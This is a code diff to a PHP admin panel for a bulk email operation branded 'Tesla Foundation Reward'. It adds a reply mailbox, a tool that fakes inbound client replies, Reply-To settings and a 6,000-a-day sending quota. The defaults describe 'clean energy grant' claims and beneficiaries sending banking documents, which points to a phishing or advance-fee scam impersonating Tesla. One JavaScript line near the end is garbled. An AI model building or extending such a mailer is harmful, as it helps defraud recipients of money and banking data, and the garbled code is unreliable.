@@ -219,6 +219,52 @@ if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST' && csrf_check()) {
     exit;
   }
 
+  // Action B3: 1-on-1 Direct Client Response (support@teslafoundationreward.com)
+  if ($act === 'send_reward_reply') {
+    $to = clean($_POST['to'] ?? '', 120);
+    $subject = clean($_POST['subject'] ?? '', 200) ?: 'Tesla Foundation Reward • Communication';
+    $bodyHtml = (string) ($_POST['html'] ?? '');
+    $inboxMsgId = (int) ($_POST['inbox_id'] ?? 0);
+
+    if (empty($to) || !filter_var($to, FILTER_VALIDATE_EMAIL)) {
+      flash('error', 'Please enter a valid client recipient email.');
+      header("Location: {$self}?view=reward_compose");
+      exit;
+    }
+
+    $content = $bodyHtml ?: '<div style="font-family:Arial,sans-serif;padding:20px;border:1px solid #e2e8f0;border-radius:8px;"><h2>Tesla Foundation Reward</h2><p>Thank you for your correspondence regarding your clean energy grant inquiry.</p><p>Our verification team has received your submission.</p><p>Regards,<br>Tesla Foundation Reward Desk<br>support@teslafoundationreward.com</p></div>';
+
+    $res = send_dual_email($to, $subject, $content, strip_tags($content), 'Tesla Foundation Reward', 'support@teslafoundationreward.com', 'support@teslafoundationreward.com', 'auto_balance', null, '', '');
+
+    if (!empty($res['ok'])) {
+      if ($inboxMsgId > 0) {
+        mark_inbox_read($inboxMsgId, true);
+      }
+      flash('success', "1-on-1 response dispatched to {$to} from support@teslafoundationreward.com! (ID: {$res['id']})");
+    } else {
+      flash('error', "Failed to dispatch response: " . ($res['error'] ?? 'Delivery failed'));
+    }
+
+    header("Location: {$self}?view=reward_sent");
+    exit;
+  }
+
+  // Action B4: Simulate Inbound Client Reply into Reward Mailbox
+  if ($act === 'simulate_reward_reply') {
+    $testSender = clean($_POST['test_sender'] ?? '', 120) ?: ('client.' . rand(100, 999) . '@gmail.com');
+    $testName = clean($_POST['test_name'] ?? 'Beneficiary Client', 120);
+    $testSubj = clean($_POST['test_subject'] ?? 'Re: Tesla Energy Foundation Grant Allocation Claim', 255);
+    $testBody = clean($_POST['test_body'] ?? 'Hello Support Team, I am replying with our updated banking and allocation documents.', 2000);
+
+    $snippet = mb_substr($testBody, 0, 160);
+    $msgId = '<client-reply-' . time() . '.' . bin2hex(random_bytes(4)) . '@teslafoundationreward.com>';
+    $ins = $pdo->prepare('INSERT INTO inbox_messages (message_id, from_name, from_email, to_email, subject, body_html, body_text, snippet, is_read, category) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0, "reward_inbox")');
+    $ins->execute([$msgId, $testName, $testSender, 'support@teslafoundationreward.com', $testSubj, nl2br(htmlspecialchars($testBody)), $testBody, $snippet]);
+    flash('success', "Inbound client inquiry from {$testName} received into Reward Mailbox!");
+    header("Location: {$self}?view=reward_inbox");
+    exit;
+  }
+
   // Action C: Save All Settings
   if ($act === 'save_all_settings') {
     // Identity
@@ -376,6 +422,35 @@ if ($authed) {
       }
     }
   }
+
+  $rewardStats = get_reward_inbox_stats();
+  $rewardMessages = [];
+  $activeRewardMsg = null;
+  $rewardSentLogs = [];
+
+  if ($view === 'reward_inbox') {
+    $filter = clean($_GET['filter'] ?? 'all');
+    if ($filter === 'unread') {
+      $rewardMessages = $pdo->query("SELECT * FROM inbox_messages WHERE is_read = 0 AND (to_email LIKE '%teslafoundationreward.com%' OR category LIKE 'reward%') ORDER BY id DESC")->fetchAll();
+    } else {
+      $rewardMessages = $pdo->query("SELECT * FROM inbox_messages WHERE to_email LIKE '%teslafoundationreward.com%' OR category LIKE 'reward%' ORDER BY id DESC LIMIT 100")->fetchAll();
+    }
+
+    if (!empty($_GET['read_id'])) {
+      $rId = (int) $_GET['read_id'];
+      $st = $pdo->prepare('SELECT * FROM inbox_messages WHERE id = ?');
+      $st->execute([$rId]);
+      $activeRewardMsg = $st->fetch();
+      if ($activeRewardMsg) {
+        mark_inbox_read($rId, true);
+        $rewardStats = get_reward_inbox_stats();
+      }
+    }
+  }
+
+  if ($view === 'reward_sent') {
+    $rewardSentLogs = $pdo->query("SELECT * FROM email_logs WHERE from_address LIKE '%teslafoundationreward.com%' ORDER BY id DESC LIMIT 100")->fetchAll();
+  }
 }
 
 // Check provider configurations (Primary & Secondary Gateways)
@@ -471,39 +546,55 @@ $googleConfigured = !empty($googleUser);
         </div>
 
         <nav class="nav">
-          <div class="nav-group-label">Mailbox</div>
-          <a class="nav-item <?= $view === 'inbox' ? 'active' : '' ?>" href="?view=inbox">
+          <div class="nav-group-label" style="display:flex; justify-content:space-between; align-items:center;">
+            <span>Response Mailbox</span>
+            <span class="badge badge-amber badge-mono" style="font-size:9.5px; padding:1px 5px;">support@</span>
+          </div>
+
+          <a class="nav-item <?= $view === 'reward_inbox' ? 'active' : '' ?>" href="?view=reward_inbox">
             <svg class="nav-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
               stroke-linecap="round" stroke-linejoin="round">
               <polyline points="22 12 16 12 14 15 10 15 8 12 2 12" />
               <path
                 d="M5.45 5.11 2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z" />
             </svg>
-            <span>Inbox</span>
-            <?php if (!empty($inboxStats['unread'])): ?><span
-                class="count"><?= $inboxStats['unread'] ?></span><?php endif; ?>
+            <span>Client Inquiries</span>
+            <?php if (!empty($rewardStats['unread'])): ?><span
+                class="count"><?= $rewardStats['unread'] ?></span><?php endif; ?>
           </a>
 
-          <a class="nav-item <?= ($view === 'sent' || $view === 'outbox') ? 'active' : '' ?>" href="?view=sent">
+          <a class="nav-item <?= $view === 'reward_compose' ? 'active' : '' ?>" href="?view=reward_compose">
+            <svg class="nav-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
+              stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 20h9" />
+              <path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" />
+            </svg>
+            <span>1-on-1 Client Reply</span>
+          </a>
+
+          <a class="nav-item <?= $view === 'reward_sent' ? 'active' : '' ?>" href="?view=reward_sent">
             <svg class="nav-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
               stroke-linecap="round" stroke-linejoin="round">
               <line x1="22" y1="2" x2="11" y2="13"></line>
               <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
             </svg>
-            <span>Sent Mail</span>
-            <?php if (!empty($stats['totalSent'])): ?><span class="badge badge-mono small"
-                style="margin-left:auto;"><?= number_format($stats['totalSent']) ?></span><?php endif; ?>
+            <span>Sent Responses</span>
+            <?php if (!empty($rewardStats['sent'])): ?><span class="badge badge-mono small"
+                style="margin-left:auto;"><?= number_format($rewardStats['sent']) ?></span><?php endif; ?>
           </a>
 
-          <a class="nav-item <?= $view === 'replies' ? 'active' : '' ?>" href="?view=replies">
+          <div class="nav-group-label" style="display:flex; justify-content:space-between; align-items:center;">
+            <span>Outbound Mailer (6k)</span>
+            <span class="badge badge-mono" style="font-size:9.5px; padding:1px 5px;">service@</span>
+          </div>
+
+          <a class="nav-item <?= $view === 'campaigns' ? 'active' : '' ?>" href="?view=campaigns">
             <svg class="nav-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
               stroke-linecap="round" stroke-linejoin="round">
-              <polyline points="9 17 4 12 9 7" />
-              <path d="M20 18v-2a4 4 0 0 0-4-4H4" />
+              <path d="M21.5 2.5 10.5 13.5" />
+              <path d="M21.5 2.5 14.5 21l-4-7.5-7.5-4 18.5-7Z" />
             </svg>
-            <span>Replies</span>
-            <?php if (!empty($inboxStats['total'])): ?><span class="badge badge-mono small"
-                style="margin-left:auto;"><?= number_format($inboxStats['total']) ?></span><?php endif; ?>
+            <span>Campaign Studio (6k)</span>
           </a>
 
           <a class="nav-item <?= $view === 'compose' ? 'active' : '' ?>" href="?view=compose">
@@ -512,10 +603,27 @@ $googleConfigured = !empty($googleUser);
               <path d="M12 20h9" />
               <path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" />
             </svg>
-            <span>Compose / Send</span>
+            <span>Quick Send / Test</span>
           </a>
 
-          <div class="nav-group-label">Dispatch &amp; Campaigns</div>
+          <a class="nav-item <?= $view === 'inbox' ? 'active' : '' ?>" href="?view=inbox">
+            <svg class="nav-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
+              stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="9 17 4 12 9 7" />
+              <path d="M20 18v-2a4 4 0 0 0-4-4H4" />
+            </svg>
+            <span>General Inbound</span>
+          </a>
+
+          <a class="nav-item <?= ($view === 'sent' || $view === 'outbox') ? 'active' : '' ?>" href="?view=sent">
+            <svg class="nav-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
+              stroke-linecap="round" stroke-linejoin="round">
+              <line x1="22" y1="2" x2="11" y2="13"></line>
+              <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
+            </svg>
+            <span>All Outbound Logs</span>
+          </a>
+
           <a class="nav-item <?= $view === 'overview' ? 'active' : '' ?>" href="?view=overview">
             <svg class="nav-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
               stroke-linecap="round" stroke-linejoin="round">
@@ -569,18 +677,21 @@ $googleConfigured = !empty($googleUser);
 
         <!-- SIDEBAR CIRCULAR COUNTER -->
         <?php
-          $sentTodayCount = (int)($stats['todaySent'] ?? 0);
-          $dailyCapPct = min(100, max(0, round(($sentTodayCount / 6000) * 100)));
+        $sentTodayCount = (int) ($stats['todaySent'] ?? 0);
+        $dailyCapPct = min(100, max(0, round(($sentTodayCount / 6000) * 100)));
         ?>
         <div class="nav-circular-counter">
           <svg viewBox="0 0 36 36" class="circular-chart">
-            <path class="circle-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"/>
-            <path class="circle-bar" stroke="#e82127" stroke-dasharray="<?= $dailyCapPct ?>, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"/>
-            <text x="18" y="20.5" class="circle-pct" text-anchor="middle" font-size="7.5" font-weight="700" fill="#ffffff"><?= $dailyCapPct ?>%</text>
+            <path class="circle-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+            <path class="circle-bar" stroke="#e82127" stroke-dasharray="<?= $dailyCapPct ?>, 100"
+              d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+            <text x="18" y="20.5" class="circle-pct" text-anchor="middle" font-size="7.5" font-weight="700"
+              fill="#ffffff"><?= $dailyCapPct ?>%</text>
           </svg>
           <div class="circular-meta">
             <span class="circular-title">Daily 6k Quota</span>
-            <span class="circular-val"><?= number_format($sentTodayCount) ?> <span style="font-size:10px; color:#94a3b8; font-weight:normal;">/ 6k</span></span>
+            <span class="circular-val"><?= number_format($sentTodayCount) ?> <span
+                style="font-size:10px; color:#94a3b8; font-weight:normal;">/ 6k</span></span>
             <span class="circular-sub"><?= number_format(max(0, 6000 - $sentTodayCount)) ?> remaining</span>
           </div>
         </div>
@@ -842,7 +953,8 @@ $googleConfigured = !empty($googleUser);
                   <p class="small muted mb-2">
                     <strong>teslaenergyfoundation.com</strong> is configured for outbound dispatch and incoming replies.
                     All recipient replies are routed directly to
-                    <strong>service@teslaenergyfoundation.com</strong> via injected <span class="mono">Reply-To</span> headers.
+                    <strong>service@teslaenergyfoundation.com</strong> via injected <span class="mono">Reply-To</span>
+                    headers.
                   </p>
                   <div class="alert mb-2">
                     <strong>High Deliverability Notice</strong>
@@ -926,7 +1038,8 @@ $googleConfigured = !empty($googleUser);
                 </p>
               </div>
               <div class="row" style="gap:8px;">
-                <button type="button" class="btn btn-sm" onclick="document.getElementById('test-inbound-box').classList.toggle('hide');">
+                <button type="button" class="btn btn-sm"
+                  onclick="document.getElementById('test-inbound-box').classList.toggle('hide');">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                     style="width:14px; height:14px; margin-right:4px;">
                     <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
@@ -953,11 +1066,13 @@ $googleConfigured = !empty($googleUser);
             </div>
 
             <!-- TEST INBOUND REPLY SIMULATION BOX -->
-            <div id="test-inbound-box" class="card mb-3 hide" style="border: 2px dashed var(--accent); background:rgba(232,33,39,0.04);">
+            <div id="test-inbound-box" class="card mb-3 hide"
+              style="border: 2px dashed var(--accent); background:rgba(232,33,39,0.04);">
               <div class="card-head">
                 <h2>Simulate Inbound Beneficiary Reply</h2>
                 <div class="spacer"></div>
-                <button type="button" class="btn btn-sm btn-ghost" onclick="document.getElementById('test-inbound-box').classList.add('hide');">&times; Close</button>
+                <button type="button" class="btn btn-sm btn-ghost"
+                  onclick="document.getElementById('test-inbound-box').classList.add('hide');">&times; Close</button>
               </div>
               <form method="post" action="<?= $self ?>" class="card-body">
                 <?= csrf_field() ?>
@@ -978,7 +1093,8 @@ $googleConfigured = !empty($googleUser);
                 </div>
                 <div class="field">
                   <label>Message Content</label>
-                  <textarea class="textarea" name="test_body" rows="3" required>Hello Tesla Energy Foundation, I received your clean energy grant notification and would like to confirm my allocation documents.</textarea>
+                  <textarea class="textarea" name="test_body" rows="3"
+                    required>Hello Tesla Energy Foundation, I received your clean energy grant notification and would like to confirm my allocation documents.</textarea>
                 </div>
                 <button type="submit" class="btn btn-primary btn-sm">Receive Inbound Test Message</button>
               </form>
@@ -989,11 +1105,15 @@ $googleConfigured = !empty($googleUser);
               <div class="card-body">
                 <div class="row between mb-2">
                   <div>
-                    <div class="small text-muted font-semibold uppercase" style="letter-spacing:0.5px;">Live Inbound &amp; Dispatch Activity &bull; Message Counter Bar</div>
+                    <div class="small text-muted font-semibold uppercase" style="letter-spacing:0.5px;">Live Inbound &amp;
+                      Dispatch Activity &bull; Message Counter Bar</div>
                     <div style="font-size:18px; font-weight:700; color:var(--ink); margin-top:2px;">
                       <span style="color:var(--accent);"><?= number_format($inboxStats['unread']) ?> Unread Inquiries</span>
-                      <span class="muted" style="font-weight:400;">&bull; <?= number_format($inboxStats['total']) ?> Total Replies</span>
-                      <span class="muted" style="font-weight:400;">&bull; <strong class="mono" style="color:#10b981;"><?= number_format($stats['todaySent']) ?> / 6,000</strong> Dispatched Today</span>
+                      <span class="muted" style="font-weight:400;">&bull; <?= number_format($inboxStats['total']) ?> Total
+                        Replies</span>
+                      <span class="muted" style="font-weight:400;">&bull; <strong class="mono"
+                          style="color:#10b981;"><?= number_format($stats['todaySent']) ?> / 6,000</strong> Dispatched
+                        Today</span>
                     </div>
                   </div>
                   <div class="row" style="gap:16px; align-items:center;">
@@ -1354,26 +1474,24 @@ $googleConfigured = !empty($googleUser);
                         <label>Dispatch Mode</label>
                         <div class="stack" style="gap:8px;">
                           <label class="check">
-                            <input type="radio" name="provider_mode" value="auto_balance" checked>
+                            <input type="radio" name="provider_mode" value="resend_only" checked>
                             <span>
-                              <strong>Auto-Balance (Recommended)</strong>
-                              <div class="small muted">Balances <?= get_setting('resend_ratio', '60') ?>% Resend +
-                                <?= 100 - (int) get_setting('resend_ratio', '60') ?>% Google with instant failover
-                              </div>
+                              <strong>Resend Paid API (Active)</strong>
+                              <div class="small muted">Direct HTTPS dispatch via verified domain</div>
                             </span>
                           </label>
                           <label class="check">
-                            <input type="radio" name="provider_mode" value="resend_only">
+                            <input type="radio" name="provider_mode" value="auto_balance">
                             <span>
-                              <strong>Resend Paid API Only</strong>
-                              <div class="small muted">Direct HTTPS dispatch</div>
+                              <strong>Auto-Balance (Dual Gateway)</strong>
+                              <div class="small muted">Resend + Google Workspace SMTP (once connected)</div>
                             </span>
                           </label>
                           <label class="check">
                             <input type="radio" name="provider_mode" value="google_only">
                             <span>
                               <strong>Google Workspace SMTP Only</strong>
-                              <div class="small muted">Direct via smtp.gmail.com:465</div>
+                              <div class="small muted">Connect later via smtp.gmail.com:465</div>
                             </span>
                           </label>
                         </div>
@@ -1416,27 +1534,35 @@ $googleConfigured = !empty($googleUser);
             </div>
 
             <!-- COMPOSE DISPATCH METER & COUNTER -->
-            <div class="card mb-3" style="max-width:760px; border-left:4px solid var(--accent); background:linear-gradient(135deg, rgba(232, 33, 39, 0.08) 0%, var(--surface-2) 100%);">
+            <div class="card mb-3"
+              style="max-width:760px; border-left:4px solid var(--accent); background:linear-gradient(135deg, rgba(232, 33, 39, 0.08) 0%, var(--surface-2) 100%);">
               <div class="card-body" style="padding:16px 20px;">
                 <div class="row between" style="align-items:center; flex-wrap:wrap; gap:16px;">
                   <div style="display:flex; align-items:center; gap:14px;">
-                    <div style="width:42px; height:42px; border-radius:10px; background:rgba(232, 33, 39, 0.15); display:flex; align-items:center; justify-content:center; color:var(--accent); font-size:20px;">
+                    <div
+                      style="width:42px; height:42px; border-radius:10px; background:rgba(232, 33, 39, 0.15); display:flex; align-items:center; justify-content:center; color:var(--accent); font-size:20px;">
                       ✉️
                     </div>
                     <div>
-                      <div style="font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; color:#94a3b8;">Compose Dispatch Meter</div>
+                      <div
+                        style="font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; color:#94a3b8;">
+                        Compose Dispatch Meter</div>
                       <div style="font-size:18px; font-weight:700; font-family:var(--font-mono); color:#ffffff;">
-                        <?= number_format($stats['todaySent']) ?> <span style="font-size:13px; color:#94a3b8; font-weight:normal;">/ 6,000 sent today</span>
+                        <?= number_format($stats['todaySent']) ?> <span
+                          style="font-size:13px; color:#94a3b8; font-weight:normal;">/ 6,000 sent today</span>
                       </div>
                     </div>
                   </div>
                   <div style="display:flex; align-items:center; gap:18px;">
                     <div style="text-align:right;">
                       <div style="font-size:11px; color:#94a3b8; font-weight:600;">Daily Capacity</div>
-                      <div class="mono" style="font-size:15px; font-weight:700; color:#10b981;"><?= number_format(max(0, 6000 - $stats['todaySent'])) ?> available</div>
+                      <div class="mono" style="font-size:15px; font-weight:700; color:#10b981;">
+                        <?= number_format(max(0, 6000 - $stats['todaySent'])) ?> available
+                      </div>
                     </div>
                     <div style="min-width:130px;">
-                      <div style="display:flex; justify-content:space-between; font-size:11px; color:#94a3b8; margin-bottom:4px;">
+                      <div
+                        style="display:flex; justify-content:space-between; font-size:11px; color:#94a3b8; margin-bottom:4px;">
                         <span><?= round(($stats['todaySent'] / 6000) * 100) ?>% Used</span>
                         <span>6k Cap</span>
                       </div>
@@ -1446,9 +1572,12 @@ $googleConfigured = !empty($googleUser);
                     </div>
                   </div>
                 </div>
-                <div class="mt-2 pt-2 row between small" style="border-top:1px solid rgba(255,255,255,0.06); color:#94a3b8; font-size:11.5px;">
-                  <span><strong>Sender:</strong> <span class="mono text-amber">service@teslaenergyfoundation.com</span></span>
-                  <span><strong>Reply-To:</strong> <span class="mono text-green">service@teslaenergyfoundation.com</span></span>
+                <div class="mt-2 pt-2 row between small"
+                  style="border-top:1px solid rgba(255,255,255,0.06); color:#94a3b8; font-size:11.5px;">
+                  <span><strong>Sender:</strong> <span
+                      class="mono text-amber">service@teslaenergyfoundation.com</span></span>
+                  <span><strong>Reply-To:</strong> <span
+                      class="mono text-green">service@teslaenergyfoundation.com</span></span>
                 </div>
               </div>
             </div>
@@ -1476,18 +1605,20 @@ $googleConfigured = !empty($googleUser);
 
                 <div class="row-2">
                   <div class="field">
-                    <label for="q_to">Recipient email(s) (To) <span class="muted small">(supports multiple comma-separated emails, or leave blank if using CC/BCC)</span></label>
+                    <label for="q_to">Recipient email(s) (To) <span class="muted small">(supports multiple comma-separated
+                        emails, or leave blank if using CC/BCC)</span></label>
                     <input class="input mono" id="q_to" name="to" type="text"
                       placeholder="recipient1@gmail.com, recipient2@yahoo.com (or blank if CC/BCC)"
                       value="<?= e($_GET['to'] ?? '') ?>">
-                    <div class="hint">Sending to multiple recipients counts each delivered address accurately against your 6,000 daily limit.</div>
+                    <div class="hint">Sending to multiple recipients counts each delivered address accurately against your
+                      6,000 daily limit.</div>
                   </div>
                   <div class="field">
                     <label for="q_provider">Gateway</label>
                     <select class="select" id="q_provider" name="provider">
+                      <option value="resend_only" selected>Resend Paid API (Active)</option>
                       <option value="auto_balance">Auto-Balance (Dual Gateway)</option>
-                      <option value="resend_only">Resend Paid API Only</option>
-                      <option value="google_only">Google Workspace SMTP Only</option>
+                      <option value="google_only">Google Workspace SMTP (Connect Later)</option>
                     </select>
                   </div>
                 </div>
@@ -1677,7 +1808,8 @@ $googleConfigured = !empty($googleUser);
                   </p>
                   <div class="alert">
                     <strong>Unified Email Architecture</strong>
-                    Dispatches and inbound recipient replies are unified on <strong>service@teslaenergyfoundation.com</strong>.
+                    Dispatches and inbound recipient replies are unified on
+                    <strong>service@teslaenergyfoundation.com</strong>.
                   </div>
                 </div>
               </div>
@@ -1959,7 +2091,7 @@ $googleConfigured = !empty($googleUser);
     </div>
 
     <script>
-      const TEMPLATES = <?= json_encode($templates) ?>;
+                            c        onst TEMPLATES = <?= json_encode($templates) ?>;
 
       function loadTemplate(id) {
         const t = TEMPLATES.find(x => String(x.id) === String(id));
